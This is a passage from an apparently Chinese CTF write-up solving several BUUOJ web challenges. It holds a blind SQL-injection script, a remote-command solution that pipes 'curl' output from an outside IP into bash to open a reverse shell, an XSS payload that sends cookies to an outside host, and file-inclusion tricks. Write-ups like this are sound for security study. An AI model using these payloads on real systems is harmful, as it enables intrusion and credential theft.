class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line">            <span class="comment"># t1=time.time()</span></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'stronger'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    <span class="comment"># print(database)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_passwrod</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'password'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_database() #p3rh4ps</span></span><br><span class="line">    get_passwrod() <span class="comment">#OhyOuFOuNdit</span></span><br></pre></td></tr></table></figure>

<p>登入即可拿到flag</p>
<h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>提示源码是swp文件，访问/.index.php.swp，然后恢复得到源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#39;girl_friend&#39;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl &#x3D; $_POST[&#39;girl_friend&#39;];</span><br><span class="line">    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;</span><br><span class="line">        die(&#39;just girl&#39;);</span><br><span class="line">    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F;duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了<code>/，&gt;，\</code>不能直接反弹，但是可以使用curl、wget等其他命令来获取外部弹shell的命令，</p>
<p>将反弹shell命令写入文件index.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>本地起一个web服务器,然后后台运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:80 &amp;</span><br><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure>

<p>post数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">girl_friend&#x3D;curl 174.1.75.158 | bash</span><br></pre></td></tr></table></figure>

<p>即可收到shell</p>
<p>flag不在/flag中，然后找flag，grep能用，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-4.4$ grep -r <span class="string">"flag&#123;"</span> /etc</span><br><span class="line">grep -r <span class="string">"flag&#123;"</span> /etc</span><br><span class="line">grep: /etc/crontabs/root: Permission denied</span><br><span class="line">grep: /etc/shadow: Permission denied</span><br><span class="line">/etc/demo/P3rh4ps/love/you/flag:flag&#123;6d6c7ac7-8d71-4e3e-a08d-9ba541ef6fa9&#125;</span><br><span class="line">grep: /etc/mysql/my.cnf: Permission denied</span><br><span class="line">grep: /etc/shadow-: Permission denied</span><br></pre></td></tr></table></figure>







<h2 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h2><p>打开题目是一个爆破界面，说爆破的时间越久，成功率越大</p>
<p>查看源码，有一条隐藏的提示</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"white"</span>&gt;</span>Note : Remenmber to remove test.php!<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be809d4c-8717-4842-bc82-61bf35da3a1d.node3.buuoj.cn&#x2F;test.php</span><br></pre></td></tr></table></figure>

<p>点击input</p>
<p>然后就开始爆破，发现是js写的，点击check，发现有cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dXNlcg&#x3D;MTU4MDMwODE2Ng&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>base64解密后，发现是unix时间戳，把他改小，发现成功率变大，改成负数，直到成功率到100以上。点check</p>
<p>得到密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Burst successed! The passwd is av11664517@1583985203.</span><br></pre></td></tr></table></figure>

<p>根据提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[hint for Schrödinger]</span><br><span class="line">多注意cookie   	</span><br><span class="line">最后密码是b站的av号 flag在b站上</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;av11664517</span><br></pre></td></tr></table></figure>

<p>查看评论拿到flag</p>
<h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>打开是一个登入界面，除了admin都可以登录，登入会有跳转，抓包</p>
<p>发现最后有一个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- L0g1n.php --&gt;</span><br></pre></td></tr></table></figure>

<p>于是访问<code>L0g1n.php</code></p>
<p>根据提示修改http header</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/L0g1n.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:25033</span><br><span class="line"><span class="attribute">User-Agent</span>: Contiki/1.0 (Commodore 64;http://dunkels.com/adam/contiki/)</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://node3.buuoj.cn:25033/</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Client-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">From</span>: root@gem-love.com</span><br><span class="line"><span class="attribute">Referer</span>: gem-love.com</span><br><span class="line"><span class="attribute">Via</span>: y1ng.vip</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=4alc8h9smgnefqbeqd641mr7c1;time=158488078800</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>

<p>返回数据</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"gb2312"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>假猪套天下第一<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        *&#123;<span class="attribute">margin</span>:<span class="number">0px</span>; <span class="attribute">padding</span>:<span class="number">0px</span>;&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.botCenter</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>; <span class="attribute">height</span>:<span class="number">35px</span>; <span class="attribute">line-height</span>:<span class="number">35px</span>; <span class="attribute">background</span>:<span class="number">#DDA0DD</span>; <span class="attribute">position</span>:fixed; <span class="attribute">bottom</span>:<span class="number">0px</span>; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">font-size</span>:<span class="number">14px</span>; <span class="attribute">color</span>:<span class="number">#000</span>; <span class="attribute">text-align</span>:center;&#125;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">"#DDA0DD"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://gem-love.com/"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"botCenter"</span>&gt;</span>@颖奇L'Amore<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">black</span> <span class="attr">size</span>=<span class="string">32px</span>&gt;</span></span><br><span class="line">        Sorry, even you are good at http header, you're still not my admin.<span class="tag">&lt;<span class="name">br</span>&gt;</span> Althoungh u found me, u still dont know where is flag <span class="comment">&lt;!--ZmxhZ3s1NWU5ZWI3ZC1jYTIwLTQ4YzQtYWFmZC1iYTJlNmJmZDFmNzR9Cg==--&gt;</span></span><br></pre></td></tr></table></figure>

<p>将base64解密即可</p>
<h2 id="xss之光"><a href="#xss之光" class="headerlink" title="xss之光"></a>xss之光</h2><p>.git泄露</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn CTF.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri Mar 27 14:32:55 2020</span><br><span class="line">URL_BASE: http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn/</span><br><span class="line">WORDLIST_FILES: CTF.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 52</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn/ ----</span><br><span class="line">+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git (CODE:301|SIZE:185)</span><br><span class="line">+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git/index (CODE:200|SIZE:118)</span><br><span class="line">+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git/config (CODE:200|SIZE:137)</span><br><span class="line">+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git/ (CODE:403|SIZE:571)</span><br><span class="line">                                                                               e.php.swp</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Fri Mar 27 14:32:57 2020</span><br><span class="line">DOWNLOADED: 52 - FOUND: 4</span><br></pre></td></tr></table></figure>

<p>利用githack得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'yds_is_so_beautiful'</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>

<p>利用php原生类进行xss读取cookie</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"&lt;script src='http://1.1.1.1'+btoa(document.cookie)&gt;&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>本地cookie即可看见flag</p>
<h2 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h2><p>扫描发现有robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Disallow: &#x2F;flag.php</span><br><span class="line">Disallow: &#x2F;admin.php</span><br><span class="line">Allow: &#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>http header有提示，访问home.php，url是下面这种形式，存在文件包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home.php?file&#x3D;system</span><br></pre></td></tr></table></figure>

<p>伪协议读文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;home.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">setcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);</span><br><span class="line">setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;\^|\~|&amp;|\|&#x2F;&quot;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">        die(&quot;forbidden&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;.?a.?d.?m.?i.?n.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;You! are! not! my! admin!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;^home$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;禁止套娃&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;system$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">            $file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;现在访问的是 &quot;.$file . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        require $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;location.href&#x3D;&#39;.&#x2F;home.php?file&#x3D;system&#39;&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;system.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 &#x3D; &#39;       Error:  url invalid&lt;br&gt;~$ &#39;;</span><br><span class="line">$str3 &#x3D; &#39;       Error:  damn hacker!&lt;br&gt;~$ &#39;;</span><br><span class="line">$str4 &#x3D; &#39;       Error:  request method error&lt;br&gt;~$ &#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;simform-inner&quot;&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;ol class&#x3D;&quot;questions&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你知道目录下都有什么文件吗?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;请输入你想检测文件内容长度的url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你希望以何种方式访问？GET？POST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">            &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;controls&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;number&quot;&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">				&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var theForm &#x3D; document.getElementById( &#39;theForm&#39; );</span><br><span class="line"></span><br><span class="line">    new stepsForm( theForm, &#123;</span><br><span class="line">        onSubmit : function( form ) &#123;</span><br><span class="line">            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );</span><br><span class="line">            var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; );</span><br><span class="line">            form.submit();</span><br><span class="line">            messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;;</span><br><span class="line">            classie.addClass( messageEl, &#39;show&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);  &#x2F;&#x2F;</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;&#x2F;&#x2F;sprintf(format,arg1,arg2,arg++) 函数把格式化的字符串写入一个变量中。 此处$detect是字符串,传入的$method包含%s即可得到文件源码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: f108f177-b544-4c43-91dc-a160c7fc77f8.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 53</span><br><span class="line"><span class="attribute">Origin</span>: http://f108f177-b544-4c43-91dc-a160c7fc77f8.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: 